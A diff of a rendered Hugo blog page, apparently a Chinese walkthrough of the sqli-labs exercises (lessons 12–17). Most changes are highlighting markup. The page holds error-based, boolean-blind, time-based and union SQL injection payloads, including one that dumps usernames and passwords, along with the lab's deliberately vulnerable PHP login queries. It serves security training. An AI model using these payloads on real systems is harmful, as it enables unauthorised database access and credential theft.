-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- -
+</span></span></span></code></pre></div><ol>
 <li>延时注入</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or if(substr(database(),1,1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;, sleep(5), 1)-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or if(substr(database(),1,1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;, sleep(5), 1)-- -
+</span></span></span></code></pre></div><ol>
 <li>布尔注入</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or left(database(),1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-12">lesson 12</h4>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// connectivity
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or left(database(),1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;-- -
+</span></span></span></code></pre></div><h4 id="lesson-12">lesson 12</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// connectivity
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$uname</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$passwd</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=(</span><span class="si">$uname</span><span class="s2">) and password=(</span><span class="si">$passwd</span><span class="s2">) LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>也可以手工测试
+</span></span></code></pre></div><p>也可以手工测试
 此时 <code>1'</code> 没有起到闭合的作用，因此什么都没有发生
 尝试 <code>1&quot;</code> ,报错，此时闭合了一个双引号，还需要escape括号</p>
 <figure><img src="/ox-hugo/2022-04-21_21-43-06_screenshot.png" width="700px"/>
@@ -1344,69 +741,30 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 <li>报错注入</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;)and extractvalue(1, concat(0x7e, database(), 0x7e))-- -
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;)and extractvalue(1, concat(0x7e, database(), 0x7e))-- -
 </span></span></span><span class="line"><span class="cl"><span class="s2">
 </span></span></span><span class="line"><span class="cl"><span class="s2">1&#34;</span><span class="p">)</span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">user</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">3</span><span class="p">)</span><span class="c1">-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
+</span></span></span></code></pre></div><ol>
 <li>布尔注入</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;) or left(database(),1)&gt;&#39;a&#39;-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;) or left(database(),1)&gt;&#39;a&#39;-- -
+</span></span></span></code></pre></div><ol>
 <li>延时注入</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;) or if(substr(database(),1,1)&gt;&#39;a&#39;,sleep(5), 1)-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;) or if(substr(database(),1,1)&gt;&#39;a&#39;,sleep(5), 1)-- -
+</span></span></span></code></pre></div><ol>
 <li>常规注入</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;) union select 1, concat_ws(&#34;</span><span class="o">:</span><span class="s2">&#34;, username, password) from users-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-13">lesson 13</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;) union select 1, concat_ws(&#34;</span><span class="o">:</span><span class="s2">&#34;, username, password) from users-- -
+</span></span></span></code></pre></div><h4 id="lesson-13">lesson 13</h4>
 <p>看源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=(&#39;</span><span class="si">$uname</span><span class="s2">&#39;) and password=(&#39;</span><span class="si">$passwd</span><span class="s2">&#39;) LIMIT 0,1&#34;</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=(&#39;</span><span class="si">$uname</span><span class="s2">&#39;) and password=(&#39;</span><span class="si">$passwd</span><span class="s2">&#39;) LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>同样也可以手工测试</p>
+</span></span></code></pre></div><p>同样也可以手工测试</p>
 <p><code>1'</code> 报错， <code>1&quot;</code> 不报错</p>
 <figure><img src="/ox-hugo/2022-04-21_22-01-09_screenshot.png" width="700px"/>
 </figure>
@@ -1414,54 +772,19 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 <p>可以确定，与前面两题类似，只是用 <code>('')</code> 包裹，同时报错被注释了，不再赘述</p>
 <h4 id="lesson-14">lesson 14</h4>
 <p>看源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$passwd</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=</span><span class="si">$uname</span><span class="s2"> and password=</span><span class="si">$passwd</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>手工测试 <code>1&quot;</code> 报错
+</span></span></code></pre></div><p>手工测试 <code>1&quot;</code> 报错
 确认由=&quot;&quot;= 包裹，不再赘述</p>
 <h4 id="lesson-15">lesson 15</h4>
 <p>看源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=&#39;</span><span class="si">$uname</span><span class="s2">&#39; and password=&#39;</span><span class="si">$passwd</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=&#39;</span><span class="si">$uname</span><span class="s2">&#39; and password=&#39;</span><span class="si">$passwd</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size=&#34;3&#34;&gt;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//echo &#34;Try again looser&#34;;
@@ -1472,84 +795,31 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;img src=&#34;../images/slap.jpg&#34;   /&gt;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>这里注释掉了error，因此只能依靠盲注</p>
+</span></span></code></pre></div><p>这里注释掉了error，因此只能依靠盲注</p>
 <p>首先想办法闭合</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; or 1=1-- - #成功闭合
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39; or 1=1-- - #成功闭合
 </span></span></span><span class="line"><span class="cl"><span class="s1">1&#34; or 1=1-- - #闭合失败
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>了解是 <code>''</code> 包裹，接下来开始盲注</p>
+</span></span></span></code></pre></div><p>了解是 <code>''</code> 包裹，接下来开始盲注</p>
 <ol>
 <li>布尔盲注</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or left(database(),1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;-- -
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or left(database(),1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">-1&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="s2">&#34;92&#34;</span><span class="c1">-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p><del>2. 报错盲注（报错被禁用了）</del></p>
+</span></span></span></code></pre></div><p><del>2. 报错盲注（报错被禁用了）</del></p>
 <ol>
 <li>延时盲注</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;or if(left(database(),1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;,sleep(5),1)-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-16">lesson 16</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;or if(left(database(),1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;,sleep(5),1)-- -
+</span></span></span></code></pre></div><h4 id="lesson-16">lesson 16</h4>
 <p>看源码</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$passwd</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=(</span><span class="si">$uname</span><span class="s2">) and password=(</span><span class="si">$passwd</span><span class="s2">) LIMIT 0,1&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span>
 </span></span><span class="line"><span class="cl">    <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size=&#34;3&#34;&gt;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
@@ -1562,84 +832,27 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;img src=&#34;../images/slap.jpg&#34;  /&gt;&#39;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>先手工测试一下=1&rsquo;= <code>1&quot;</code> 均没有报错，结合源码得知报错被禁用
+</span></span></code></pre></div><p>先手工测试一下=1&rsquo;= <code>1&quot;</code> 均没有报错，结合源码得知报错被禁用
 尝试闭合</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or 1=1-- -
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or 1=1-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">-1&#34; or 1=1-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">-1&#39;</span><span class="p">)</span> <span class="k">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="o">--</span> <span class="o">-</span>
 </span></span><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;) or 1=1-- - #成功
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
+</span></span></span></code></pre></div><ol>
 <li>布尔盲注</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;) or left(database(),1)&gt;&#39;a&#39;-- -
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;) or left(database(),1)&gt;&#39;a&#39;-- -
 </span></span></span><span class="line"><span class="cl"><span class="s2">-1&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="s2">&#34;92&#34;</span><span class="c1">-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p><del>2. 报错盲注（报错被禁用了）</del></p>
+</span></span></span></code></pre></div><p><del>2. 报错盲注（报错被禁用了）</del></p>
 <ol>
 <li>延时盲注</li>
 </ol>
 <!-- raw HTML omitted -->
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;)or if(left(database(),1)&gt;&#39;a&#39;,sleep(5),1)-- -
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h4 id="lesson-17">lesson 17</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;)or if(left(database(),1)&gt;&#39;a&#39;,sleep(5),1)-- -
+</span></span></span></code></pre></div><h4 id="lesson-17">lesson 17</h4>
 <p>直接看源码，我们之前提到过，有对数据库操作的地方就有可能会发生注入，那在lesson 17当中，我们发现服务端进行了两次数据库操作，一次SELECT，一次UPDATE，那到底是不是两个都存在注入呢？</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span><span class="o">=</span><span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$uname</span><span class="o">=</span><span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">
@@ -1665,9 +878,7 @@ MySQL server version for the right syntax to use near ””) LIMIT 0,1′ at li
 </span></span><span class="line"><span class="cl">        <span class="c1">//echo $update;
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="o">......</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>很明显不是的，这里的 <code>$uname</code> 无法被很好地被我们利用，原因是服务端对 <code>$uname</code> 进行了过滤 <code>check_input()</code>:
+</span></span></code></pre></div><p>很明显不是的，这里的 <code>$uname</code> 无法被很好地被我们利用，原因是服务端对 <code>$uname</code> 进行了过滤 <code>check_input()</code>:
 首先用 <code>substr()</code> 限制了变量的长度，让我们无法放置很长的查询语句
 PHP默认会所有的 <code>GET</code>, <code>POST</code>, <code>COOKIE</code> 数据自动执行 <code>addslashes()</code> 函数，旨在预定义字符添加反斜杠字符串：</p>
 <ul>
@@ -1681,43 +892,7 @@ PHP默认会所有的 <code>GET</code>, <code>POST</code>, <code>COOKIE</code> �
